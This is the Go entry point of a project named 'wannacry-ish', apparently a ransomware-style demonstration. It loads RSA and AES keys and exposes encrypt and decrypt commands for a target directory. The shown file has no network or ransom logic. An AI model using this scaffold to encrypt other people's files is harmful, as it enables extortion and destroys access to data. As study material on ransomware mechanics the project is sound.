package main

import (
	"crypto/rsa"
	"fmt"
	"os"

	"github.com/J4NN0/wannacry-ish/internal/command"
	"github.com/J4NN0/wannacry-ish/internal/key"
	"github.com/spf13/cobra"
)

func main() {
	aesKey, rsaPrivateKey, rsaPublicKey, err := loadKeys()
	if err != nil {
		fmt.Printf("Failed to load keys: %v\n", err)
		return
	}

	cmd := command.New(aesKey, rsaPrivateKey, rsaPublicKey)

	var rootCmd = &cobra.Command{
		Use:   "wannacry-ish",
		Short: "File Encryption/Decryption CLI",
		Long:  "A CLI tool for encrypting or decrypting files in a specified directory.",
	}

	encryptCmd := &cobra.Command{
		Use:   "encrypt",
		Short: "Encrypt files in a directory",
		Run:   cmd.EncryptCmdRun,
	}
	decryptCmd := &cobra.Command{
		Use:   "decrypt",
		Short: "Decrypt files in a directory",
		Run:   cmd.DecryptCmdRun,
	}

	rootCmd.PersistentFlags().StringVarP(&cmd.Directory, "directory", "d", "", "Directory containing files to process")

	rootCmd.AddCommand(encryptCmd)
	rootCmd.AddCommand(decryptCmd)

	if err := rootCmd.Execute(); err != nil {
		fmt.Println(err)
		os.Exit(1)
	}
}

func loadKeys() ([]byte, *rsa.PrivateKey, *rsa.PublicKey, error) {
	privateKey, err := key.LoadPrivateKey()
	if err != nil {
		return nil, nil, nil, fmt.Errorf("error loading private key: %w", err)
	}
	publicKey := key.ExtractPublicKey(privateKey)

	encryptedAESKey, err := key.LoadEncryptedAESKey()
	if err != nil {
		return nil, nil, nil, fmt.Errorf("error loading encrypted AES key: %w", err)
	}

	aesKey, err := key.DecryptAESKey(encryptedAESKey, privateKey)
	if err != nil {
		return nil, nil, nil, fmt.Errorf("error decrypting AES key: %w", err)
	}

	return aesKey, privateKey, publicKey, nil
}
